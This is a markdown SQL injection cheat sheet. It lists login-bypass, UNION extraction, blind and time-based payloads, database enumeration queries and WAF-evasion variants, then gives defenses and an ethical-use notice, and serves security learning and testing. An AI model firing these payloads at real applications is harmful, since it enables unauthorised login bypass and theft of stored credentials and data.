# 💉 SQL Injection Quick Ref

> SQL injection is an injection flaw where attacker-controlled input is interpreted as part of a SQL query. It can lead to authentication bypass, data extraction, privilege escalation, or remote command execution in some stacks.

## 1) Core idea

```sql
SELECT * FROM users WHERE username = 'admin' AND password = 'pass';
```

If input is not properly sanitized, input like:

```text
' OR '1'='1
```

can turn into:

```sql
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = 'pass';
```

This may make the condition always true.

---

## 2) Basic payloads

### Authentication bypass

```sql
' OR '1'='1
```

```sql
admin' --
```

```sql
' OR 1=1 -- -
```

### Numeric injection

```sql
1 OR 1=1
```

```sql
1 UNION SELECT null,null
```

---

## 3) Union-based SQLi

### Typical flow

```sql
SELECT name, email FROM users WHERE id = 1 UNION SELECT username, password FROM admins;
```

### Useful payloads

```sql
' UNION SELECT NULL, NULL --
```

```sql
' UNION SELECT username, password FROM users --
```

```sql
' UNION SELECT version(), database() --
```

### Check column count

```sql
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --
```

When the query errors, the correct column count is known.

---

## 4) Boolean blind SQL injection

```sql
' AND 1=1 --
' AND 1=2 --
```

Payloads used to infer true/false responses:

```sql
' AND SUBSTRING(database(),1,1)='a' --
```

```sql
' AND LENGTH(database())=8 --
```

```sql
' AND (SELECT COUNT(*) FROM users)>0 --
```

This relies on timing or response differences from the application.

---

## 5) Time-based blind SQLi

MySQL / MariaDB:

```sql
' OR SLEEP(5) --
```

PostgreSQL:

```sql
' OR pg_sleep(5) --
```

MSSQL:

```sql
' WAITFOR DELAY '00:00:05' --
```

---

## 6) Error-based SQLi

Often easier because the DB returns error output.

```sql
' UNION SELECT @@version --
```

```sql
' OR 1=CONVERT(int,(SELECT @@version)) --
```

```sql
' UNION SELECT user(), database() --
```

---

## 7) Common DB queries

### MySQL

```sql
SELECT version();
SELECT database();
SELECT user();
SHOW TABLES;
SELECT * FROM information_schema.tables;
```

### PostgreSQL

```sql
SELECT version();
SELECT current_database();
SELECT current_user;
SELECT table_name FROM information_schema.tables;
```

### MSSQL

```sql
SELECT @@VERSION;
SELECT DB_NAME();
SELECT SUSER_SNAME();
SELECT name FROM master.dbo.sysdatabases;
```

---

## 8) Finding injection points

Look for:

- search boxes
- login forms
- parameterized URLs
- filter/sort pages
- API query parameters
- cookie values
- user-controlled headers

Typical examples:

```text
?id=1
?search=admin
?user=alice
?category=books
```

---

## 9) Quick testing workflow

1. Inject a quote: `'`
2. Check for error message or changed response
3. Try `OR 1=1`
4. Check column count with `ORDER BY`
5. Use `UNION SELECT` to read data
6. Enumerate DB metadata
7. Extract user/password hashes
8. Check for privilege escalation opportunities

---

## 10) Example login bypass

Original query:

```sql
SELECT * FROM users WHERE username = 'admin' AND password = 'secret';
```

Payload:

```sql
admin' OR '1'='1' --
```

Result:

```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1' -- ' AND password = 'secret';
```

This often causes the login check to always evaluate true.

---

## 11) WAF / filtering evasion ideas

```sql
admin'/**/OR/**/'1'='1
```

```sql
admin'-- -
```

```sql
' OR 'a'='a
```

```sql
' UNION ALL SELECT NULL,NULL --
```

Some defenses block obvious payloads, so obfuscation and encoding may still be needed in testing labs.

---

## 12) Defensive controls

- Use parameterized queries / prepared statements
- Validate and normalize user input
- Apply least privilege database accounts
- Disable verbose SQL errors in production
- Use web app firewalls with careful tuning
- Audit database logs for suspicious queries

---

## 13) Ethical use

Only use SQLi testing in:

- authorized environments
- your own lab
- CTF/ethical security practice
- client engagements with explicit permission

Do not test or exploit production systems without approval.

---

## 14) Common cheat payloads

```sql
' OR 1=1 --
' OR '1'='1
admin' --
' UNION SELECT NULL --
' UNION SELECT username,password FROM users --
' AND SUBSTRING(database(),1,1)='a' --
' OR SLEEP(5) --
```

---

## 15) Final reminder

The best SQL injection defense is not a long list of filters — it is correct query construction. Prepared statements and strong input validation are the standard safe practice.


